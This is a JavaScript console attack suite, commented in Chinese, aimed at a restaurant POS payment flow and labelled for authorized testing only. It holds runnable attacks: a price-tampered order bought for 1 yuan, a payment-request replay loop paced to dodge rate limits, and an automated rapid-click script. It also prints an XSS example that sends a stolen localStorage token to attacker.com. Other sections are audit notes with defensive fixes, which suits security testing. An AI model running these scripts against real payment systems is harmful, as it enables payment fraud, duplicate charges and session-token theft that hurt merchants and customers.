/**
 * ============================================================
 * POS收银端支付链路 - 饱和式安全攻击脚本套件
 * ============================================================
 *
 * 使用方法：
 * 1. 在浏览器DevTools Console中运行
 * 2. 或保存为 .js 文件通过 <script> 注入
 *
 * 警告：仅用于授权的安全测试！未经授权使用违法！
 * ============================================================
 */

const POS_ATTACK_SUITE = {

  // ========================================
  // A类攻击：支付流程操控
  // ========================================

  /**
   * ATTACK-001: 绕过UI直接调用API创建订单并支付
   * 严重程度: CRITICAL
   * 攻击复杂度: LOW
   */
  async attack_001_bypassUI() {
    console.group('🔴 [ATTACK-001] 绕过UI直接调用支付API');

    try {
      // 步骤1: 构造恶意订单数据（价格篡改）
      const maliciousOrder = {
        tableNumber: 1,
        items: [
          { id: 'dish_001', name: '豪华套餐', price: 0.01, quantity: 100, dishType: 'combo' }
        ],
        totalAmount: 1,  // 原价可能是 10000 元，现改为 1 元！
        orderType: 'dinein'
      };

      console.log('📤 发送恶意订单:', maliciousOrder);

      // 直接调用 createOrder API (绕过 Payment.vue UI)
      const createResponse = await fetch('/api/v1/pos/order', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${localStorage.getItem('token')}`
        },
        body: JSON.stringify(maliciousOrder)
      });

      const createResult = await createResponse.json();
      console.log('📥 订单创建响应:', createResult);

      if (createResult.data?.orderId) {
        // 步骤2: 直接调用 payOrder API
        const payResponse = await fetch('/api/v1/pos/order/pay', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${localStorage.getItem('token')}`
          },
          body: JSON.stringify({
            orderId: createResult.data.orderId,
            paymentMethod: '现金支付'  // 可改为任意支付方式
          })
        });

        const payResult = await payResponse.json();
        console.log('💰 支付结果:', payResult);

        if (payResult.data?.orderId) {
          console.error('⚠️ 攻击成功！以 1 元购买了价值 10000 元的商品！');
        }
      }
    } catch (error) {
      console.error('❌ 攻击失败:', error);
    }

    console.groupEnd();
  },

  /**
   * ATTACK-002: 通过URL参数注入恶意订单数据
   * 严重程度: CRITICAL
   * 攻击复杂度: LOW
   */
  attack_002_urlInjection() {
    console.group('🔴 [ATTACK-002] URL参数注入攻击');

    // 构造恶意URL - 直接访问支付页面并注入篡改的数据
    const maliciousItems = encodeURIComponent(JSON.stringify([
      { id: 'hack_001', name: '免费商品', price: 0, quantity: 999, dishType: 'single' }
    ]));

    const attackUrl = `/payment?table=1&items=${maliciousItems}&total=0`;

    console.log('🔗 恶意URL (可直接在地址栏输入):');
    console.log(window.location.origin + attackUrl);
    console.log('');
    console.log('💡 复现步骤:');
    console.log('1. 打开浏览器访问上述URL');
    console.log('2. 页面会显示 "免费商品 x999, 总计 ¥0.00"');
    console.log("3. 点击 '确认支付' 按钮");
    console.log('4. 系统可能以 0 元完成订单！');

    console.groupEnd();
  },

  /**
   * ATTACK-003: 重放攻击 - 复制成功的支付请求
   * 严重程度: HIGH
   * 攻击复杂度: MEDIUM
   */
  async attack_003_replayAttack(orderId) {
    console.group('🟠 [ATTACK-003] 支付请求重放攻击');

    if (!orderId) {
      console.log('请提供要重放的 orderId');
      console.log('用法: POS_ATTACK_SUITE.attack_003_replayAttack("ORDER_123")');
      console.groupEnd();
      return;
    }

    // 重放相同的支付请求 5 次
    for (let i = 1; i <= 5; i++) {
      console.log(`🔄 第 ${i} 次重放...`);

      try {
        const response = await fetch('/api/v1/pos/order/pay', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${localStorage.getItem('token')}`
          },
          body: JSON.stringify({
            orderId: orderId,
            paymentMethod: '微信支付'
          })
        });

        const result = await response.json();
        console.log(`📊 重放 #${i} 结果:`, result.code === 200 ? '成功 ⚠️' : '失败 ✓');

        // 如果后端没有幂等性校验，可能导致重复扣款！
        if (result.code === 200) {
          console.error(`⚠️ 危险！第 ${i} 次重放也成功了！可能已重复扣款！`);
        }
      } catch (error) {
        console.error(`❌ 重放 #${i} 失败:`, error);
      }

      // 稍微延迟避免触发速率限制
      await new Promise(resolve => setTimeout(resolve, 500));
    }

    console.groupEnd();
  },

  /**
   * ATTACK-004: DevTools实时篡改请求参数
   * 严重程度: HIGH
   * 攻击复杂度: LOW
   */
  attack_004_devToolsTamper() {
    console.group('🟠 [ATTACK-004] DevTools参数篡改指南');

    console.log('📖 复现步骤:');
    console.log('');
    console.log('1. 打开 Payment.vue 页面，添加商品到购物车');
    console.log('2. 按 F12 打开开发者工具');
    console.log('3. 切换到 Network (网络) 标签页');
    console.log("4. 点击 '确认支付' 按钮");
    console.log('5. 在 Network 中找到 POST /api/v1/pos/order 请求');
    console.log('6. 右键 → Copy as cURL (或查看 Payload)');
    console.log('');
    console.log('🎯 可篡改的参数:');
    console.log('- items[].price: 商品单价 (改为 0.01)');
    console.log('- items[].quantity: 数量 (改为负数或极大值)');
    console.log('- totalAmount: 总金额 (改为 1)');
    console.log('- tableNumber: 桌号 (改为其他桌号)');
    console.log('');
    console.log('💀 高级技巧:');
    console.log('- 使用 Chrome DevTools 的 "Override content" 功能');
    console.log('- 使用 Burp Suite / Fiddler 拦截修改请求');
    console.log('- 使用 Tampermonkey 脚本自动修改');

    console.groupEnd();
  },

  // ========================================
  // B类攻击：状态管理安全
  // ========================================

  /**
   * ATTACK-005: 强制重置 paying 锁（双击/竞态）
   * 严重程度: HIGH
   * 攻击复杂度: LOW
   */
  attack_005_resetPayingLock() {
    console.group('🟠 [ATTACK-005] 强制重置支付锁');

    console.log('🔓 方法1: 控制台直接修改 Vue 响应式状态');
    console.log('// 在 DevTools Console 中执行:');
    console.log('// 获取 Vue 实例并修改 paying 状态');
    console.log(`
// 方法A: 通过 __vue_app__ 访问 (Vue 3)
const app = document.querySelector('.pos-payment').__vue_app__;
// 找到组件实例并重置 paying 为 false

// 方法B: 直接刷新页面 (最简单!)
location.reload();  // paying 锁会立即重置！

// 方法C: 快速双击按钮 (利用 JS 异步特性)
// 在 paying=true 设置和 API 调用之间有微小时间窗口
`);

    console.log('');
    console.log('⚡ 方法2: 自动化双击脚本');
    console.log(`
// 创建一个模拟快速双击的函数
function rapidDoubleClick() {
  const btn = document.querySelector('.confirm-btn');
  if (btn) {
    // 连续触发 10 次点击 (间隔 10ms)
    for (let i = 0; i < 10; i++) {
      setTimeout(() => btn.click(), i * 10);
    }
  }
}
rapidDoubleClick();
`);

    console.log('💥 影响: 可能导致重复创建订单、重复扣款！');
    console.groupEnd();
  },

  /**
   * ATTACK-006: currentStep 状态操控
   * 严重程度: MEDIUM
   * 攻击复杂度: LOW
   */
  attack_006_manipulateStep() {
    console.group('🟡 [ATTACK-006] 操控支付步骤状态');

    console.log('📍 当前实现分析:');
    console.log('- currentStep 是 Vue ref，初始值为 1');
    console.log('- 仅用于 UI 显示 (步骤指示器高亮)');
    console.log('- 不影响实际业务逻辑流程');
    console.log('');
    console.log('🎯 但如果后端依赖此字段...');
    console.log('// 可以尝试将 currentStep 设为非法值');
    console.log(`
// 在控制台执行:
const app = document.querySelector('.pos-payment');
// 尝试访问并修改 internal instance
// currentStep.value = 99;  // 非法步骤
// currentStep.value = -1;  // 负数步骤
`);
    console.log('');
    console.log('✅ 当前风险: 低 (仅影响UI显示)');
    console.log('⚠️ 潜在风险: 如果未来版本加入步骤校验逻辑');

    console.groupEnd();
  },

  /**
   * ATTACK-007: 订单数据持久化缺失测试
   * 严重程度: MEDIUM
   * 攻击复杂度: LOW
   */
  attack_007_dataPersistence() {
    console.group('🟡 [ATTACK-007] 支付中断导致数据丢失测试');

    console.log('🧪 测试场景: 支付过程中刷新页面');
    console.log('');
    console.log('📋 复现步骤:');
    console.log('1. 在 Order.vue 添加商品，点击"去结算"');
    console.log('2. 进入 Payment.vue 页面');
    console.log('3. 点击"确认支付"按钮');
    console.log('4. 在看到步骤指示器变为步骤2时，立即按 F5 刷新');
    console.log('');
    console.log('🔍 观察结果:');
    console.log('- ❌ 订单数据从 URL query 参数丢失？');
    console.log('- ❌ 已创建的订单ID丢失 (createResult.orderId 未持久化)?');
    console.log('- ❌ 用户不知道订单是否已创建？');
    console.log('- ❌ 可能出现幽灵订单 (已创建但前端不知道)?');
    console.log('');
    console.log('💾 当前代码问题 (Payment.vue L261-273):');
    console.log(`// 数据仅在 onMounted 时从 URL 读取一次
const items = route.query.items as string;
// ... 如果用户刷新页面，URL 参数可能还在，
// 但 createResult.orderId (内存变量) 会丢失！
`);

    console.groupEnd();
  },

  // ========================================
  // C类攻击：敏感数据处理
  // ========================================

  /**
   * ATTACK-008: XSS Token 窃取模拟
   * 严重程度: CRITICAL
   * 攻击复杂度: MEDIUM
   */
  attack_008_xssTokenTheft() {
    console.group('🔴 [ATTACK-008] XSS Token 窃取演示');

    console.log('🔑 当前 Token 存储方式: localStorage');
    console.log('📍 位置: request.ts L10');
    console.log('');
    console.log('⚠️ localStorage 的安全问题:');
    console.log('- 任何 XSS 攻击都可读取 localStorage');
    console.log('- 无法设置 HttpOnly 标志');
    console.log('- 与 JavaScript 同源策略绑定');
    console.log('');
    console.log('💉 模拟 XSS 攻击窃取 Token:');
    console.log(`
// 如果攻击者能注入以下代码 (例如通过不安全的 v-html):
const token = localStorage.getItem('token');
fetch('https://attacker.com/steal?token=' + token);

// 或更隐蔽的方式:
new Image().src = 'https://attacker.com/collect?data=' + btoa(localStorage.getItem('token'));
`);
    console.log('');
    console.log('🎯 攻击向量 (本系统可能的入口):');
    console.log('- 菜品名称/描述包含 <script> 标签 (如果使用 v-html)');
    console.log('- 第三方组件漏洞 (Element Plus 等)');
    console.log('- URL 参数反射型 XSS (虽然 Vue 会转义)');
    console.log('');
    console.log('🛡️ 防御建议:');
    console.log('- 使用 HttpOnly Cookie 存储 Token');
    console.log('- 实施 CSP (Content Security Policy)');
    console.log('- 输入消毒和输出编码');

    console.groupEnd();
  },

  /**
   * ATTACK-009: 敏感信息泄露检查
   * 严重程度: MEDIUM
   * 攻击复杂度: LOW
   */
  attack_009_infoDisclosure() {
    console.group('🟡 [ATTACK-009] 敏感信息泄露检查');

    console.log('🔍 检查项 1: URL 中的敏感信息');
    console.log('当前URL:', window.location.href);
    if (window.location.search.includes('items=') ||
        window.location.search.includes('total=')) {
      console.error('⚠️ 发现: 订单数据暴露在URL中！');
      console.log('- URL会被记录在浏览器历史');
      console.log('- URL会被发送到 Referrer 头');
      console.log('- URL可能被日志系统记录');
    }

    console.log('');
    console.log('🔍 检查项 2: LocalStorage 中的敏感数据');
    Object.keys(localStorage).forEach(key => {
      const value = localStorage.getItem(key);
      if (key.toLowerCase().includes('token') ||
          key.toLowerCase().includes('order') ||
          key.toLowerCase().includes('user')) {
        console.log(`🔑 发现敏感键: ${key} = ${value?.substring(0, 20)}...`);
      }
    });

    console.log('');
    console.log('🔍 检查项 3: 控制台日志泄露');
    console.log('✅ Payment.vue 无 console.log (良好)');
    console.log('⚠️ Order.vue L340 有 console.error (开发模式可接受)');

    console.groupEnd();
  },

  /**
   * ATTACK-010: 错误消息信息泄露测试
   * 严重程度: MEDIUM
   * 攻击复杂度: LOW
   */
  async attack_010_errorMessageLeak() {
    console.group('🟡 [ATTACK-010] 错误消息信息泄露测试');

    console.log('🧪 测试: 触发异常并观察错误消息');
    console.log('');

    // 测试1: 发送畸形请求
    console.log('测试1: 发送畸形JSON');
    try {
      const resp = await fetch('/api/v1/pos/order', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${localStorage.getItem('token')}`
        },
        body: '{ invalid json !!!'
      });
      const errResult = await resp.json();
      console.log('畸形JSON响应:', errResult);
      console.log('⚠️ 检查是否泄露: 堆栈信息、SQL语句、服务器路径、框架版本');
    } catch (e) {
      console.log('请求失败:', e.message);
    }

    console.log('');

    // 测试2: 使用无效Token
    console.log('测试2: 使用无效Token');
    try {
      const resp = await fetch('/api/v1/pos/order', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': 'Bearer invalid_token_12345'
        },
        body: JSON.stringify({ test: true })
      });
      const authResult = await resp.json();
      console.log('无效Token响应:', authResult);
      console.log('⚠️ 检查是否泄露: 认证机制细节、用户存在性等');
    } catch (e) {
      console.log('请求失败:', e.message);
    }

    console.log('');
    console.log('📝 当前代码的错误处理 (Payment.vue L332-333):');
    console.log(`catch (error: unknown) {
  const errMsg = error instanceof Error ? error.message : '支付流程异常'
  ElMessage.error(errMsg)  // ← 直接显示给用户！
}`);
    console.log('⚠️ 风险: error.message 可能包含技术细节');

    console.groupEnd();
  },

  // ========================================
  // D类攻击：API调用链安全
  // ========================================

  /**
   * ATTACK-011: 类型断言绕过测试
   * 严重程度: HIGH
   * 攻击复杂度: LOW
   */
  async attack_011_typeAssertionBypass() {
    console.group('🟠 [ATTACK-011] as unknown as 类型断言安全测试');

    console.log('📍 问题代码位置: Payment.vue L300, L314');
    console.log(`
const createResult = await posApi.createOrder(orderData) as unknown as OrderResult
const payResult = await posApi.payOrder({...}) as unknown as OrderResult
`);
    console.log('');
    console.log('⚠️ as unknown as 的危险之处:');
    console.log('- 完全绕过 TypeScript 编译时类型检查');
    console.log('- 运行时可能得到 null / undefined / 任意类型');
    console.log('- 隐藏潜在的 API 响应格式变化');
    console.log('');

    // 模拟API返回异常数据
    console.log('🧪 场景模拟: API返回非预期格式');

    const abnormalResponses = [
      { code: 200, data: null },                    // data为null
      { code: 200, data: undefined },               // data为undefined
      { code: 200 },                                // 缺少data字段
      { code: 200, data: { orderId: null } },       // orderId为null
      { code: 200, data: 'string_instead_of_object' }, // 字符串而非对象
      { code: 500, message: 'Internal Server Error' }, // 错误响应
    ];

    for (let i = 0; i < abnormalResponses.length; i++) {
      const mockResponse = abnormalResponses[i];
      console.log(`\n场景 ${i + 1}:`, JSON.stringify(mockResponse));

      // 模拟 as unknown as 断言后的行为
      const result = mockResponse.data as any as { orderId?: string };
      console.log(`  result =`, result);
      console.log(`  result?.orderId =`, result?.orderId);
      console.log(`  !result?.orderId =`, !result?.orderId);  // 这决定了代码走向！

      if (!result?.orderId) {
        console.log(`  → 进入错误分支 (L303-306): ElMessage.error + return`);
        console.log(`  ⚠️ BUG: paying锁未释放! (详见 FRONT-PAY-001)`);
      } else {
        console.log(`  → 继续执行支付逻辑`);
      }
    }

    console.groupEnd();
  },

  /**
   * ATTACK-012: 响应拦截器边界情况测试
   * 严重程度: MEDIUM
   * 攻击复杂度: MEDIUM
   */
  attack_012_responseInterceptor() {
    console.group('🟡 [ATTACK-012] request.ts 响应拦截器边界测试');

    console.log('📍 代码位置: request.ts L21-38');
    console.log('');
    console.log('🔍 边界情况分析:');

    const testCases = [
      {
        name: '正常成功响应',
        input: { data: { code: 200, data: { orderId: '123' } } },
        expected: { orderId: '123' },
        description: '应该正确提取 data.data'
      },
      {
        name: 'code为0 (兼容处理)',
        input: { data: { code: 0, data: { orderId: '456' } } },
        expected: { orderId: '456' },
        description: 'code===0 也视为成功 (L26)'
      },
      {
        name: 'data为undefined',
        input: { data: { code: 200 } },
        expected: { code: 200 },
        description: '返回整个data对象 (L27 ternary)'
      },
      {
        name: '非标准响应格式',
        input: { data: { success: true, result: {} } },
        expected: { success: true, result: {} },
        description: '无code字段，返回原始data (L32)'
      },
      {
        name: '业务错误 (code=400)',
        input: { data: { code: 400, message: '参数错误' } },
        expected: Promise.reject({ message: '参数错误', status: 400 }),
        description: '应该reject (L29)'
      },
      {
        name: '网络错误',
        input: { response: { data: { message: 'Network Error' } } },
        expected: Promise.reject({ message: 'Network Error' }),
        description: 'error拦截器处理 (L35-36)'
      }
    ];

    testCases.forEach((tc, idx) => {
      console.log(`\n${idx + 1}. ${tc.name}`);
      console.log(`   输入: ${JSON.stringify(tc.input)}`);
      console.log(`   描述: ${tc.description}`);
    });

    console.log('');
    console.log('⚠️ 潜在问题:');
    console.log('- L27: data.data !== undefined ? data.data : data');
    console.log('  当 data.data 显式为 undefined 时返回整个 data 对象');
    console.log('  可能导致下游代码收到意外结构');
    console.log('');
    console.log('- L35: error.response?.data?.message 的可选链');
    console.log('  如果 error.response 不存在，fallback 到 error.message');
    console.log('  可能泄露 Axios 内部错误信息');

    console.groupEnd();
  },

  // ========================================
  // E类攻击：UI/UX 安全
  // ========================================

  /**
   * ATTACK-013: 支付确认缺失测试
   * 严重程度: HIGH
   * 攻击复杂度: LOW
   */
  attack_013_missingConfirmation() {
    console.group('🟠 [ATTACK-013] 支付确认对话框缺失');

    console.log('📍 代码位置: Payment.vue L119, L281-337');
    console.log('');
    console.log('❌ 当前实现:');
    console.log(`<el-button @click="confirmPayment" :loading="paying">
  确认支付
</el-button>`);
    console.log('');
    console.log('⚠️ 问题: 点击即支付，无二次确认！');
    console.log('');
    console.log('💥 风险场景:');
    console.log('1. 误触: 收银员不小心点到支付按钮');
    console.log('2. 快速操作: 忙碌时连续点击');
    console.log('3. 恶意操作: 他人短暂接触终端');
    console.log('');
    console.log('✅ 应该有:');
    console.log(`<el-button @click="showPayConfirmDialog">
  确认支付
</el-button>

<el-dialog v-model="showConfirm" title="确认支付">
  <p>即将支付 ¥{{ totalAmount.toFixed(2) }}</p>
  <p>支付方式: {{ getPaymentMethodName(selectedMethod) }}</p>
  <template #footer>
    <el-button @click="confirmPayment">确认</el-button>
    <el-button @click="showConfirm = false">取消</el-button>
  </template>
</el-dialog>`);

    console.groupEnd();
  },

  /**
   * ATTACK-014: 超时机制缺失测试
   * 严重程度: MEDIUM
   * 攻击复杂度: LOW
   */
  async attack_014_timeoutTest() {
    console.group('🟡 [ATTACK-014] 支付超时机制测试');

    console.log('⏱️ 当前超时配置:');
    console.log('- axios 全局超时: 30000ms (30秒) - request.ts L5');
    console.log('- confirmPayment 函数: 无独立超时控制');
    console.log('');
    console.log('🧪 测试场景: 服务端响应缓慢 (>30秒)');

    console.log('模拟慢响应:');
    const startTime = Date.now();

    try {
      // 设置一个很长的超时来测试行为
      const controller = new AbortController();
      setTimeout(() => controller.abort(), 35000); // 35秒后中止

      console.log('发送请求... (等待35秒超时)');
      const response = await fetch('/api/v1/pos/order', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${localStorage.getItem('token')}`
        },
        body: JSON.stringify({ test: true }),
        signal: controller.signal
      });

      const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
      console.log(`响应时间: ${elapsed}秒`);
      console.log('响应状态:', response.status);

    } catch (error) {
      const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
      console.log(`❌ 请求失败 (${elapsed}秒):`, error.name);

      if (error.name === 'AbortError') {
        console.log('→ 请求被超时中止');
        console.log('⚠️ 用户界面状态:');
        console.log('- paying.value 仍为 true? (L283设置的)');
        console.log('- currentStep 显示哪个步骤?');
        console.log('- 用户能看到错误提示吗?');
        console.log('- 能否再次点击支付?');
      }
    }

    console.log('');
    console.log('⚠️ 缺失的超时保护:');
    console.log('1. createOrder 和 payOrder 分别可能耗时30秒');
    console.log('2. 总等待时间可达60秒 (不可接受!)');
    console.log('3. 无进度提示 ("正在创建订单..." / "正在支付...")');
    console.log('4. 超时后 UI 状态可能不一致');
    console.log('');
    console.log('✅ 建议: 为每个API调用添加独立超时和加载状态');

    console.groupEnd();
  },

  /**
   * ATTACK-015: 网络中断一致性测试
   * 严重程度: HIGH
   * 攻击复杂度: MEDIUM
   */
  attack_015_networkInterruption() {
    console.group('🟠 [ATTACK-015] 网络中断一致性测试');

    console.log('🔬 关键时序问题 (TOCTOU - Time of Check to Time of Use):');
    console.log('');
    console.log('时序图:');
    console.log(`
T+0ms    用户点击"确认支付"
         paying.value = true (L283)
         currentStep.value = 1 (L284)

T+100ms  POST /api/v1/pos/order (创建订单)
         ↓ 等待响应...

T+500ms  ✅ 收到响应: { orderId: "ORD_20240115_001" }
         createResult.orderId = "ORD_20240115_001"

T+501ms  🌐 网络突然断开!

T+502ms  POST /api/v1/pos/order/pay (支付订单)
         ↓ 等待响应...

T+30000ms ❌ 超时! 网络错误!
         → catch 块执行 (L331-336)
         → ElMessage.error("支付流程异常")
         → finally: paying.value = false (L335)

❓ 问题:
1. 后端: 订单 ORD_20240115_001 已创建 (状态: 待支付)
2. 前端: 显示"支付失败"
3. 用户: 不知道订单已存在!
4. 再次点击支付? → 可能创建新订单 (重复订单!)

💀 最坏情况:
- 用户多次尝试 → 多个"幽灵订单"
- 用户放弃 → 订单永远停留在"待支付"状态
- 无法恢复 → 前端没有 orderId 持久化机制
`);

    console.log('');
    console.log('🧪 手动复现步骤:');
    console.log('1. 打开 Chrome DevTools → Network 标签');
    console.log('2. 勾选 "Offline" 模拟离线');
    console.log('3. 或者使用 Chrome 扩展 "Network Throttling"');
    console.log('4. 在 Payment.vue 点击"确认支付"');
    console.log('5. 观察第一个请求 (createOrder) 成功后，立即断网');
    console.log('6. 观察第二个请求 (payOrder) 失败后的行为');

    console.groupEnd();
  },

  // ========================================
  // F类攻击：跨站攻击面
  // ========================================

  /**
   * ATTACK-016: CSRF 攻击面检测
   * 严重程度: MEDIUM
   * 攻击复杂度: HIGH
   */
  attack_016_csrfCheck() {
    console.group('🟡 [ATTACK-016] CSRF 攻击面分析');

    console.log('🔒 当前认证方式: Bearer Token (Authorization Header)');
    console.log('📍 位置: request.ts L12');
    console.log('');
    console.log('✅ CSRF 风险评估: 低到中');
    console.log('');
    console.log('原因分析:');
    console.log('1. Token 存储在 localStorage (非Cookie)');
    console.log('   → 不会被浏览器自动附加到跨域请求');
    console.log('2. Token 通过 Authorization header 发送');
    console.log('   → 自定义头不能被简单的 <form> 提交');
    console.log('3. 需要 JavaScript 才能读取并发送 Token');
    console.log('   → 限制了部分 CSRF 向量');
    console.log('');
    console.log('⚠️ 但仍存在的风险:');
    console.log('1. 如果存在 XSS 漏洞，攻击者可以:');
    console.log('   - 读取 localStorage 中的 Token');
    console.log('   - 构造恶意请求发送到 API');
    console.log('   - 这实际上是 "XSS + Token 劫持" 而非传统 CSRF');
    console.log('');
    console.log('2. Spring Security 默认配置:');
    console.log('   - 应启用 CSRF 保护 (即使使用 Token)');
    console.log('   - 应配置 CORS 白名单');
    console.log('   - 应检查 X-Frame-Options 防止点击劫持');

    console.groupEnd();
  },

  /**
   * ATTACK-017: 点击劫持检测
   * 严重程度: LOW
   * 攻击复杂度: HIGH
   */
  attack_017_clickjacking() {
    console.group('🟢 [ATTACK-017] 点击劫持 (Clickjacking) 检测');

    console.log('🔍 检测方法: 检查 X-Frame-Options / CSP frame-ancestors');
    console.log('');

    // 检测当前页面是否可以被嵌入 iframe
    console.log('🧪 测试: 尝试检测 iframe 嵌入');
    console.log(`
if (window.self !== window.top) {
  console.log('⚠️ 警告: 此页面被嵌入在 iframe 中!');
  console.log('父页面URL:', document.referrer);
} else {
  console.log('✅ 正常: 页面不在iframe中');
}
`);

    console.log('');
    console.log('🛡️ 防御措施 (服务端需要配置):');
    console.log(`
# Nginx 配置
add_header X-Frame-Options "SAMEORIGIN";
add_header Content-Security-Policy "frame-ancestors 'none'";

# Spring Security 配置
.headers().frameOptions().sameOrigin()
// 或
.headers().frameOptions().deny()
`);

    console.log('');
    console.log('📍 POS 收银端特殊性:');
    console.log('- 通常运行在受控环境 (店内终端)');
    console.log('- 不太可能被嵌入恶意网站');
    console.log('- 但防御-in-depth 原则建议仍然配置');

    console.groupEnd();
  },

  // ========================================
  // G类攻击：依赖安全
  // ========================================

  /**
   * ATTACK-018: 依赖版本CVE检查
   * 严重程度: INFO
   * 攻击复杂度: N/A
   */
  attack_018_dependencyAudit() {
    console.group('ℹ️ [ATTACK-018] 依赖版本安全审计');

    console.log('📦 当前依赖版本 (来自 package.json):');
    console.log('');
    console.log('核心依赖:');
    console.log('- vue: ^3.3.8');
    console.log('- element-plus: ^2.13.2');
    console.log('- axios: ^1.6.2');
    console.log('- vue-router: ^4.2.5');
    console.log('- pinia: ^2.1.7');
    console.log('- typescript: ^5.2.2');
    console.log('- vite: ^5.0.0');
    console.log('');
    console.log('✅ 版本状态 (截至2026年1月):');
    console.log('- Vue 3.3.x: 较旧，建议升级至 3.4+/3.5+ (安全修复)');
    console.log('- Element Plus 2.13.x: 相对较新');
    console.log('- Axios 1.6.x: 稳定版本，无明显公开CVE');
    console.log('- Vite 5.0.x: 有更新版本可用');
    console.log('');
    console.log('⚠️ 建议操作:');
    console.log('1. 运行 npm audit 检查已知漏洞');
    console.log('2. 定期更新依赖 (至少每季度)');
    console.log('3. 使用 Dependabot / Renovate 自动化');
    console.log('4. 锁定版本号 (移除 ^ 前缀) 以提高可预测性');

    console.log('');
    console.log('🔗 参考资源:');
    console.log('- https://github.com/advisories (GitHub Advisory Database)');
    console.log('- https://snyk.io/vuln (Snyk Vulnerability Database)');
    console.log('- https://www.cve.org/CVE record listings');

    console.groupEnd();
  },

  // ========================================
  // 综合攻击脚本
  // ========================================

  /**
   * MASTER-ATTACK: 一键综合攻击
   * 执行所有关键攻击向量
   */
  async masterAttack() {
    console.clear();
    console.log('%c🔴 POS收银端支付链路 - 饱和安全攻击套件', 'font-size: 20px; color: red; font-weight: bold;');
    console.log('%c⚠️  仅用于授权安全测试！', 'font-size: 14px; color: orange;');
    console.log('');

    console.log('='.repeat(80));
    console.log('开始执行攻击序列...');
    console.log('='.repeat(80));
    console.log('');

    // 执行所有攻击
    await this.attack_001_bypassUI();
    console.log('\n');

    this.attack_002_urlInjection();
    console.log('\n');

    this.attack_004_devToolsTamper();
    console.log('\n');

    this.attack_005_resetPayingLock();
    console.log('\n');

    this.attack_008_xssTokenTheft();
    console.log('\n');

    this.attack_011_typeAssertionBypass();
    console.log('\n');

    this.attack_013_missingConfirmation();
    console.log('\n');

    this.attack_015_networkInterruption();
    console.log('\n');

    console.log('='.repeat(80));
    console.log('攻击序列执行完毕!');
    console.log('='.repeat(80));
    console.log('');
    console.log('%c📋 请查看上方输出中的 ⚠️ 和 🔴 标记的问题', 'font-size: 14px; color: blue;');
  },

  /**
   * 快速扫描: 仅执行高危攻击
   */
  async quickScan() {
    console.clear();
    console.log('%c⚡ POS支付链路快速安全扫描', 'font-size: 18px; color: orange; font-weight: bold;');
    console.log('');

    console.log('[1/5] 检测UI绕过可能性...');
    this.attack_002_urlInjection();
    console.log('\n');

    console.log('[2/5] 检测支付锁可靠性...');
    this.attack_005_resetPayingLock();
    console.log('\n');

    console.log('[3/5] 检测Token安全性...');
    this.attack_008_xssTokenTheft();
    console.log('\n');

    console.log('[4/5] 检测确认机制...');
    this.attack_013_missingConfirmation();
    console.log('\n');

    console.log('[5/5] 检测网络中断处理...');
    this.attack_015_networkInterruption();
    console.log('\n');

    console.log('%c✅ 快速扫描完成！', 'font-size: 16px; color: green;');
  }
};

// 导出到全局作用域
window.POS_ATTACK_SUITE = POS_ATTACK_SUITE;

console.log('%c✅ POS攻击套件已加载！', 'font-size: 16px; color: green; font-weight: bold;');
console.log('');
console.log('可用命令:');
console.log('  POS_ATTACK_SUITE.masterAttack()     - 执行全部攻击');
console.log('  POS_ATTACK_SUITE.quickScan()        - 快速扫描 (仅高危)');
console.log('  POS_ATTACK_SUITE.attack_001_bypassUI()  - 单独执行某个攻击');
console.log('');
console.log('示例: POS_ATTACK_SUITE.quickScan()');
